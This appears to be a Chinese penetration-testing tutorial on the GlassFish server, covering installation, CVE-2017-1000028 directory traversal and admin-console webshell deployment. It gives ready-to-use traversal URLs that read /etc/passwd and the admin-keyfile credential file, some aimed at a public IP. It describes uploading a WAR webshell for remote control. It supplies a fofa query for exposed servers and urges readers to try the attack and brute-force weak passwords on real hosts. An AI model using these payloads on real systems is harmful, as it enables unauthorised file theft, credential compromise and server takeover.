## 系列文章

> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)

## 简介

 **渗透测试-地基篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

中间件是介于应用系统和系统软件之间的一类软件，它使用系统软件所提供的基础服务（功能），衔接网络上应用系统的各个部分或不同的应用，能够达到资源共享、功能共享的目的。

可想而知中间件连接着网络和系统接触着越来越多的关键数据，渐渐成为单位公共安全中最具有战略性的资产，中间件的安全稳定运行也直接决定着业务系统能否正常使用。并且平台的中间件中往往连接数据库，而数据库储存着等极其重要和敏感的信息。如果中间件被攻破，这些信息一旦被篡改或者泄露，轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。所以对数据库的保护是一项必须的，关键的，重要的工作任务。

通过前几期钓鱼、内网攻防篇章落幕后，引来了服务攻防篇章之数据库渗透篇，不管在外网还是内网环境，只要存在业务系统都存在数据库，在渗透测试对数据库的知识学习是必不可少的，接下来将介绍数据库的渗透基本操作，带小伙伴们了解和学习数据库如何渗透的！

今天会讲解到学习GlassFish简介、GlassFish和GlassFish4.1.2详细安装、GlassFish Directory
Traversal（CVE-2017-1000028）、GlassFish后台Getshell、实战GlassFish技巧等渗透操作等，最后远程代码执行控制服务器等操作，如果连GlassFish都不会安装操作提权等，怎么进行下一步的研究GlassFish安全！怎么拿下对方服务器？

## 二、GlassFish简介

GlassFish 是用于构建 Java EE 5应用服务器的开源开发项目的名称。它基于 Sun Microsystems 提供的 Sun Java
System Application Server PE 9 的源代码以及 Oracle 贡献的 TopLink
持久性代码。该项目提供了开发高质量应用服务器的结构化过程，以前所未有的速度提供新的功能。

默认端口端口：

    
    
    使用Admin的端口 4848。
    使用HTTP Instance的端口 8080。
    使用JMS的端口 7676。
    使用IIOP的端口 3700。
    使用HTTP_SSL的端口 8181。
    使用IIOP_SSL的端口 3820。
    使用IIOP_MUTUALAUTH的端口 3920。
    使用JMX_ADMIN的端口 8686。
    使用OSGI_SHELL的默认端口 6666。
    使用JAVA_DEBUGGER的默认端口 9009。
    

默认返回的指纹信息:

    
    
    Server: GlassFish Server Open Source Edition  4.1.2
    X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  4.1.2  Java/Oracle Corporation/1.8)
    

glassfish 是全认证的Java EE 服务器。包括EJB等等。  
Tomcat 是简化的，基本上只是对于Web应用的功能。  
glassfish 在控制页面和管理页面上比Tomcat要强大很多！

## 三、GlassFish安装

###
1、官网简览![1633609789_615ee83d67e11b10ff118.png!small?1633609799146](https://image.3001.net/images/20211007/1633609789_615ee83d67e11b10ff118.png!small?1633609799146)

    
    
    https://javaee.github.io/glassfish/download
    

### 2、GlassFish4.1.2详细安装

1）下载GlassFish4.1.2  
![1633609796_615ee8445ff43ec2f8fa9.png!small?1633609799146](https://image.3001.net/images/20211007/1633609796_615ee8445ff43ec2f8fa9.png!small?1633609799146)

    
    
    https://download.java.net/glassfish/4.1.2/release/glassfish-4.1.2.zip
    

下载完后解压并放到虚拟机本地C盘！

2）配置环境变量  
![1633609812_615ee8542420b58c69c9b.png!small?1633609812785](https://image.3001.net/images/20211007/1633609812_615ee8542420b58c69c9b.png!small?1633609812785)将`C:\glassfish4\bin`配置到path本地环境变量即可！

3）安装jdk6或者以上版本即可！！

4）进入glassfish/bin目录下打开CMD窗口输入asadmin start-domain启动glassfish：  
![1633609816_615ee858e5377f2fe9383.png!small?1633609817621](https://image.3001.net/images/20211007/1633609816_615ee858e5377f2fe9383.png!small?1633609817621)成功启动！

    
    
    asadmin start-domain 启动glassfish
    asadmin stop-domain 停止glassfish
    

5）测试访问  
![1633609821_615ee85d7a612cf5e7537.png!small?1633609822946](https://image.3001.net/images/20211007/1633609821_615ee85d7a612cf5e7537.png!small?1633609822946)

    
    
    http://192.168.253.100:4848/
    

成功访问！

## 四、GlassFish渗透总结

### 1、GlassFish Directory Traversal（CVE-2017-1000028）

#### 1）漏洞简介

Java语言中会把`%c0%af`解析为\uC0AF，最后转义为ASCII字符的/（斜杠）。利用`..%c0%af..%c0%af`来向上跳转，达到目录穿越、任意文件读取的效果。

计算机指定了UTF-8编码接收二进制并进行转义，当发现字节以0开头，表示这是一个标准ASCII字符 **直接转义** ，当发现110开头，则取2个字节
去掉110模板后转义。  
![1633609826_615ee862a5ffb7c4e5b2d.png!small?1633609826785](https://image.3001.net/images/20211007/1633609826_615ee862a5ffb7c4e5b2d.png!small?1633609826785)C0AF
转换位二进制为 ‭‭110 00000 10 101111‬ ，110开头去掉摸板后为00000 101111 转换为10进制为47，ASSCI为`/`！

 **受影响版本：** <=4.1.2版本

#### 2）本地复现漏洞

启动GlassFish后，访问

    
    
    http://192.168.253.100:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
    
    http://101.201.147.161:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
    

![1633609832_615ee8685091cb111464b.png!small?1633609832571](https://image.3001.net/images/20211007/1633609832_615ee8685091cb111464b.png!small?1633609832571)

读admin-keyfile文件，该文件是储存admin账号密码的文件，爆破：

目录位置：  
![1633609836_615ee86c31f3b29f00878.png!small?1633609838819](https://image.3001.net/images/20211007/1633609836_615ee86c31f3b29f00878.png!small?1633609838819)

    
    
    glassfish/domains/domain1/config/admin-keyfile
    

一般在这儿！

![1633609839_615ee86f8b460c5e7d042.png!small?1633609839944](https://image.3001.net/images/20211007/1633609839_615ee86f8b460c5e7d042.png!small?1633609839944)

    
    
    http://192.168.253.100:4848/theme/META-INF/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afdomains\domain1\config\admin-keyfile
    

![1633609843_615ee87388939dc51b4c8.png!small?1633609843984](https://image.3001.net/images/20211007/1633609843_615ee87388939dc51b4c8.png!small?1633609843984)linux系统也是一样的！

    
    
    http://101.201.147.161:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
    

**注意：**

    
    
    如果在你的机器上不能成功读取，请自行添加..%c0%af
    

### 2、GlassFish后台Getshell

#### 1）解决环境问题

（1）访问报错  
![1633609849_615ee87932456eece9655.png!small?1633609850492](https://image.3001.net/images/20211007/1633609849_615ee87932456eece9655.png!small?1633609850492)访问登录界面报错：

    
    
    Configuration Error
    Secure Admin must be enabled to access the DAS remotely.
    

（2）glassfish4以下版本都会遇到该类问题！

修改glassfish的默认admin密码：  
![1633609853_615ee87d6ea6d85009c52.png!small?1633609854588](https://image.3001.net/images/20211007/1633609853_615ee87d6ea6d85009c52.png!small?1633609854588)

    
    
    asadmin change-admin-password
    

根据提示进行就可以了。注意这里需要输入密码，默认的admin的密码为空。直接回车就可以了！

（3）设置安全机制

![1633609857_615ee881d010445870922.png!small?1633609858107](https://image.3001.net/images/20211007/1633609857_615ee881d010445870922.png!small?1633609858107)

    
    
    asadmin start-domain
    asadmin enable-secure-admin
    asadmin stop-domain         #表示允许远程安全管理
    asadmin start-domain
    

建立好安全机制去访问！

 **拓展命令:**

    
    
    enable-secure-admin 命令表示允许远程安全管理
    disable-secure-admin  是关闭远程管理的命令
    

但是允许远程安全管理 至少有一个管理员用户的口令为空, 安全管理不允许口令为空。请使用 change-admin-password
命令或管理控制台为管理员帐户创建非空口令。

（4）测试访问  
![1633609862_615ee88621b9783825cdc.png!small?1633609864009](https://image.3001.net/images/20211007/1633609862_615ee88621b9783825cdc.png!small?1633609864009)  
弹出安全机制认证！

![1633609866_615ee88a1d8e5c2b9cea1.png!small?1633609867346](https://image.3001.net/images/20211007/1633609866_615ee88a1d8e5c2b9cea1.png!small?1633609867346)已经不报错了，正常输入设置好的账号密码！

![1633609870_615ee88e1bdc8589266c8.png!small?1633609874864](https://image.3001.net/images/20211007/1633609870_615ee88e1bdc8589266c8.png!small?1633609874864)成功登录访问！

 **默认管理密码问题：**

    
    
    GlassFish2默认帐号admin密码adminadmin 。
    GlassFish3、4 如果管理员不设置帐号本地会自动登录，但是远程访问会提示配置错误。
    Configuration Error 
    Secure Admin must be enabled to access the DAS remotely.
    

#### 2）本地复现

（1）进入后台后 Applications，右边的deploy  
![1633609875_615ee893a3a0f962d7648.png!small?1633609878945](https://image.3001.net/images/20211007/1633609875_615ee893a3a0f962d7648.png!small?1633609878945)

（2）选中war包后上传，填写Context Root这个关系到你访问的url，点击Ok：  
![1633609879_615ee897ebc96fea82909.png!small?1633609884002](https://image.3001.net/images/20211007/1633609879_615ee897ebc96fea82909.png!small?1633609884002)

![1633609884_615ee89ccbb907feac436.png!small?1633609888174](https://image.3001.net/images/20211007/1633609884_615ee89ccbb907feac436.png!small?1633609888174)成功上传！

（3）测试  
![1633609889_615ee8a10bca5a2b689b5.png!small?1633609890017](https://image.3001.net/images/20211007/1633609889_615ee8a10bca5a2b689b5.png!small?1633609890017)

    
    
    http://127.0.0.1:8080/[Context Root]/[war包内的filename]
    
    http://192.168.253.102:8080/dayu/dayu.jsp
    

可看到报错了： A full JDK (not just JRE) is required！！

#### 3）解决复现环境报错

报错可知A full JDK (not just JRE) is
required！！是由于目前使用的解析为JRE，需要调成JDK解析，否则无法解析jsp文件！

 **指定使用jdk版本**  
![1633609893_615ee8a5984922c3f5d64.png!small?1633609893907](https://image.3001.net/images/20211007/1633609893_615ee8a5984922c3f5d64.png!small?1633609893907)

    
    
    asadmin
    set "server.java-config.java-home=C:\Program Files\Java\jdk1.7.0_80"
    

jdk目录别弄错，设置完重新启动！

#### 4）成功getshell

测试war木马部署情况

    
    
    http://192.168.253.102:8080/dayu/dayu.jsp
    

![1633609898_615ee8aa54e2656247c96.png!small?1633609898531](https://image.3001.net/images/20211007/1633609898_615ee8aa54e2656247c96.png!small?1633609898531)  
![1633609902_615ee8ae4a518c0f7b213.png!small?1633609904761](https://image.3001.net/images/20211007/1633609902_615ee8ae4a518c0f7b213.png!small?1633609904761)  
![1633609905_615ee8b1e576b76b09d39.png!small?1633609908959](https://image.3001.net/images/20211007/1633609905_615ee8b1e576b76b09d39.png!small?1633609908959)可看到冰蝎和大马都是可以的！！

## 五、实战搜索

### 1、实战src大法

fofa搜索语法：

    
    
    "glassfish" && port="4848"
    

![1633609910_615ee8b64eaefddb92190.png!small?1633609918146](https://image.3001.net/images/20211007/1633609910_615ee8b64eaefddb92190.png!small?1633609918146)

###
2、实战目录穿越、任意文件读取![1633609914_615ee8ba440c8bfe48a58.png!small?1633609920428](https://image.3001.net/images/20211007/1633609914_615ee8ba440c8bfe48a58.png!small?1633609920428)实战搜索存在的，小伙伴们尝试即可。

### 3、实战研究底层后台密码

#### 1）BP抓包分析

![1633609918_615ee8bea726860766d3a.png!small?1633609920429](https://image.3001.net/images/20211007/1633609918_615ee8bea726860766d3a.png!small?1633609920429)使用Burpsuiter进行登录界面抓包后进行分析！

#### 2）Intrude分析

![1633609922_615ee8c23a49877b82488.png!small?1633609924011](https://image.3001.net/images/20211007/1633609922_615ee8c23a49877b82488.png!small?1633609924011)

![1633609925_615ee8c5bfe3f66c192cb.png!small?1633609927494](https://image.3001.net/images/20211007/1633609925_615ee8c5bfe3f66c192cb.png!small?1633609927494)可看到该密码登录传输是未加密的！直接弱口令文本爆破即可！

### 4、实战延伸思路

可以学习简单python脚本进行爬，那么大量的src入囊！  
![1633609931_615ee8cb4595f92280be9.png!small?1633609936199](https://image.3001.net/images/20211007/1633609931_615ee8cb4595f92280be9.png!small?1633609936199)

参考：

    
    
    https://www.pythonf.cn/read/171932
    

## 六、总结

今天学到了GlassFish简介、GlassFish和GlassFish4.1.2详细安装、GlassFish Directory
Traversal（CVE-2017-1000028）、GlassFish后台Getshell、实战GlassFish技巧等渗透操作，最后远程代码执行控制服务器等操作，以及整改加固建议的方式方法，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！

    
    
    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）-> 服务攻防之数据库MSSQL（下）-> 服务攻防之数据库Oracle（上）-> 服务攻防之数据库Oracle（下）-> 服务攻防之数据库Redis（上）-> 服务攻防之数据库Redis（下）-> 服务攻防之数据库Mongodb（上）-> 服务攻防之数据库Mongodb（下）-> 服务攻防之中间件IIS（上）-> 服务攻防之中间件IIS（下）-> 服务攻防之中间件Apache（总）-> 服务攻防之中间件Nginx（总）-> 服务攻防之中间件Tomcat（上）-> 服务攻防之中间件Tomcat（下）-> 服务攻防之中间件JBoss（上）-> 服务攻防之中间件JBoss（中）-> 服务攻防之中间件JBoss（下）-> 服务攻防之中间件Weblogic（上）-> 服务攻防之中间件Weblogic（下）-> 服务攻防之中间件GlassFish（总）-> 服务攻防之中间件WebSphere（总）......
    

接下来在《服务攻防之中间件WebSphere（总）》会接触到如何进行WebSphere简介、WebSphere详细安装、Docker详细安装WebSphere7、Java反序列化(CVE-2015-7450）、弱口令
&& 后台Getshell、实战WebSphere经验等等渗透操作，如何提权渗透等方法，请看下篇服务攻防之中间件WebSphere篇章！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

作者：大余

